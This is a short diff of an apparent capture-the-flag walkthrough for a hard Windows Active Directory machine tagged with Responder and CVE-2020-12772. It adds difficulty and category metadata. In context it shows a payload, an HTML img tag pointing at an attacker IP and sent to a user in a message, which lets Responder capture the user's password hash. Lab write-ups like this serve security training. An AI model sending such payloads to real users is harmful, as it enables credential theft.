@@ -3,6 +3,13 @@
 
 ![](attachments/20240613140545.png)
 
+**Difficulty**: `Hard`
+
+**OS**: `Windows`
+
+**Category**: `Responder, CVE-2020-12772, windows, Active Directory`
+
+---
 
 **Story**
 
@@ -837,6 +844,7 @@ Send a message to the user with the payload
 ```javascript
  <img src="http://IP/test.img">
 ```
+
 ![](attachments/20240621105334.png)
 
 Responder will capture the hash
